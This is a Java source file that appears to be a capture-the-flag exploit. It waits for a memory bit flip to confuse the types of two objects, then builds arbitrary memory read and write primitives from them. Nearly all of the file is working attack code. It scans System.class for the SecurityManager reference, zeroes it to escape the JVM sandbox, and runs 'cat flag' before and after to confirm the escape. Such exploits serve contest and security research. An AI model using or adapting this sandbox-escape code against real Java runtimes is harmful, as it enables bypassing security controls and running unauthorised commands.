import java.util.*;
import java.io.*;
import sun.misc.*;
import java.lang.reflect.*;
import java.security.*;

public class SmartCard
{
    /*static Unsafe unsafe;
    static long getAddressUnsafe(Object obj)
    {
        Object[] array = new Object[] { obj };
        long baseOffset = unsafe.arrayBaseOffset(Object[].class);
        return unsafe.getLong(array, baseOffset);
    }
    static void initUnsafe()
    {
        try {
            Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
            theUnsafe.setAccessible(true);
            unsafe = (Unsafe) theUnsafe.get(null);
        } catch(Exception e) {
            e.printStackTrace(System.out);
        }
    }*/

    public static void main(String[] args) 
    {
        //initUnsafe();
        testCmd("echo", "hello");
        testCmd("cat", "flag");

        long totalmem = Runtime.getRuntime().totalMemory();
        System.out.format("Total amount of memory: %x\n", totalmem);
        int b_len = (int)(3*totalmem / 10L);
        System.out.format("b_len: %x\n", b_len);

        System.out.println("Initializing Bs...");
        B[] bs = new B[b_len];
        A a = new A();

        //System.out.format("A's address: %016x\n", getAddressUnsafe(a));

        for (int i = 0; i < bs.length; i++)
        {
            bs[i] = new B();
            bs[i].a1 = a;
            bs[i].a2 = a;
            bs[i].a3 = a;
            bs[i].a4 = a;
            bs[i].a5 = a;
            bs[i].a6 = a;
            bs[i].a7 = a;
        }
        a.b = bs[0];
        System.out.println("Done...");
        System.out.println("Waiting for bit flip...");
        B b = null;

        /*B[] tmp = new B[]{b};
        long baseOffset = unsafe.arrayBaseOffset(Object[].class);
        System.out.format("baseOffset: %x\n", baseOffset);
        System.out.format("gAU(tmp): %x\n", getAddressUnsafe(tmp));
        System.out.format("gAU(tmp[0]): %x\n", getAddressUnsafe(tmp[0]));
        unsafe.putLong(tmp, baseOffset, getAddressUnsafe(a));
        b = tmp[0];
        System.out.format("gAU(b): %x\n", getAddressUnsafe(b));
        System.out.format("gAU(tmp[0]): %x\n", getAddressUnsafe(tmp[0]));*/

        while(b == null)
        {
            System.out.println("Outer loop");
            for (int i = 0; b == null && i < bs.length; i++)
            {
                try {
                    if (bs[i].a1 != a)
                        b = bs[i].a1.b;
                    if (bs[i].a2 != a)
                        b = bs[i].a2.b;
                    if (bs[i].a3 != a)
                        b = bs[i].a3.b;
                    if (bs[i].a4 != a)
                        b = bs[i].a4.b;
                    if (bs[i].a5 != a)
                        b = bs[i].a5.b;
                    if (bs[i].a6 != a)
                        b = bs[i].a6.b;
                    if (bs[i].a7 != a)
                        b = bs[i].a7.b;
                } catch(NullPointerException e) {
                    System.out.format("Hit null at bs[%d]\n", i);
                }
            }
        }
        System.out.println("Found A and B pointers...");
        System.out.println(a + "\n" + b);
        /*
        if((Object)b == null) {
            System.out.println("Somehow b is still null?");
            return;
        }

        A r; B q;
        r = b.a6;
        q = r.b;

        String aRepr = String.valueOf(a);
        String adotbRepr = String.valueOf(a.b);
        String bRepr = "null";
        try {
            bRepr = String.valueOf(b);
        } catch(NullPointerException e) {
            e.printStackTrace(System.out);
        }
        System.out.format("A: %s\nA.b: %s\nB: %s\n", aRepr, adotbRepr, bRepr);
        System.out.format("r: %s\nq: %s\n", r, q);

        boolean areEqual = false;
        System.out.format("Equal by object cast? %b\n", areEqual |= ((Object) a == (Object) b));
        System.out.format("Equal by string? %b\n", areEqual |= (aRepr.equals(bRepr)));
        System.out.format("(r == q)? %b", (Object)r == (Object)q);*/
        boolean areEqual = false;
        System.out.format("Equal by object cast? %b\n", areEqual |= ((Object) a == (Object) b));
        //if(areEqual) {
        if(true) {
            globalA = a;
            globalB = b;
            /*System.out.format("getAddressUnsafe(globalA) = %016x\n", getAddressUnsafe(globalA));
            System.out.format("getAddressUnsafe(globalB) = %016x\n", getAddressUnsafe(globalB));
            System.out.format("getAddressUnsafe(System.class) = %016x\n", getAddressUnsafe(System.class));*/
            System.out.format("getAddress(globalA) = %016x\n", getAddress(globalA));
            System.out.format("getAddress(globalB) = %016x\n", getAddress(globalB));
            System.out.format("getAddress(System.class) = %016x\n", getAddress(System.class));
            C c = new C();
            c.a1 = c.a2 = c.a4 = c.a5 = c.a7 = c;
            globalA.i = 0x41414141; globalB.a1 = globalB.a1;
            globalA.i = 0x41414142; globalB.a2 = globalB.a1;
            globalA.i = 0x41414143; globalB.a3 = globalB.a1;
            globalA.i = 0x41414144; globalB.a4 = globalB.a1;
            globalA.i = 0x41414145; globalB.a5 = globalB.a1;
            globalA.i = 0x41414146; globalB.a6 = globalB.a1;
            globalA.i = 0x41414147; globalB.a7 = globalB.a1;
            globalA.i = 0xbbbbbbbb; globalA.b = globalB;
            c.o = System.class;
            globalB.a1 = c;
            int pa, pb, pc;
            /*pa = (int)getAddressUnsafe(globalA);
            pb = (int)getAddressUnsafe(globalB);
            pc = (int)getAddressUnsafe(c);*/
            pa = (int)getAddress(globalA);
            pb = (int)getAddress(globalB);
            pc = (int)getAddress(c);
            System.out.format("%08x, %08x, %08x\n\n", pa, pb, pc);
            for(int i = 0; i < 11; i++) {
                /*System.out.format("%d: %08x, %08x, %08x\n", i,
                    unsafe.getInt(a, i*4),
                    unsafe.getInt(b, i*4),
                    unsafe.getInt(c, i*4)
                );*/
                System.out.format("%d: %08x, %08x, %08x\n", i,
                    read(pa + i*4),
                    read(pb + i*4),
                    read(pc + i*4)
                );
            }
            //System.out.format("getAddress(System.class) = %016x\n", getAddress(System.class));

            int sm = getAddress(System.getSecurityManager());
            int sys = getAddress(System.class);
            System.out.format("sm: %08x\nsys: %08x\n", sm, sys);

            int smIndex = 0;
            for(; smIndex < 100; smIndex++) {
                int val = read(sys+smIndex*4);
                System.out.printf("System.class[%d]: (%08x == %08x) is %b\n", smIndex, val, sm, val == sm);
                
                if(val == sm) {
                    System.out.printf("Found SecurityManager\n");
                    write(sys+smIndex*4, 0);
                    break;
                }
            }

            testCmd("echo", "hello");
            testCmd("cat", "flag");
        }
    }
    
/*
c.a1 = c.a2 = c.a4 = c.a5 = c.a7 = c;
globalA.i = 0x41414141; globalB.a1 = globalB.a1;
globalA.i = 0x41414142; globalB.a2 = globalB.a1;
globalA.i = 0x41414143; globalB.a3 = globalB.a1;
globalA.i = 0x41414144; globalB.a4 = globalB.a1;
globalA.i = 0x41414145; globalB.a5 = globalB.a1;
globalA.i = 0x41414146; globalB.a6 = globalB.a1;
globalA.i = 0x41414147; globalB.a7 = globalB.a1;
globalA.i = 0xbbbbbbbb; globalA.b = globalB;
c.o = System.class;
-----
dca09a40, dca09a40, d1a952a0

0: a08be501, a08be501, 00000001
1: 00000015, 00000015, 00000000
2: f5d76688, f5d76688, f5d76af0
3: bbbbbbbb, bbbbbbbb, 00000000
4: 41414142, 41414142, d1a952a0
5: 41414143, 41414143, d1a952a0
6: dca09a40, dca09a40, 00000000
7: 41414145, 41414145, d1a952a0
8: 41414146, 41414146, d1a952a0
9: 41414147, 41414147, d1a952a0
10: 00000001, 00000001, d9e07b18
*/
    public static class A
    {
        public A a1; // B.a2
        public A a2;
        public B b; // B.a4
        public A a4;
        public A a5;
        public int i; // B.a1
        public A a7;
    }
    
    public static class B
    {
        public A a1;
        public A a2;
        public A a3;
        public A a4;
        public A a5;
        public A a6;
        public A a7;
    }

    public static class C extends A
    {
        public Object o;
    }

    static A globalA;
    static B globalB;

    static int headerOffset = 4 * 3;
    public static void write(int addr, int value) {
        globalA.i = addr - headerOffset;
        globalB.a1.i = value;
    }
    public static int read(int addr) {
        globalA.i = addr - headerOffset;
        return globalB.a1.i;
    }
    public static int getAddress(Object o) {
        C c = new C();
        c.o = o;
        globalB.a1 = c;
        /*System.out.format("%08x\n", globalA.i);
        for(int i = 0; i < 20; i++) {
            long tmp = (globalA.i + i*4) & 0xffffffffL;
            System.out.format("%08x[%d*4]: %08x\n", tmp, i, unsafe.getInt(tmp));
        }*/
        globalA.i += 10*4 - headerOffset;
        return globalB.a1.i;
    }

    public static void testCmd(String... cmd)
    {
        String str = Arrays.toString(cmd).replaceAll("[\\[,\\]]", "");
        System.out.print("Trying to execute command {" + str + "} ... ");
        try
        {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.inheritIO();
            pb.start().waitFor();
        }
        catch (Exception e)
        {
            System.out.println("Nope");
            return;
        }
        System.out.println("COMMAND EXECUTED SUCCESSFULLY");
    }

}
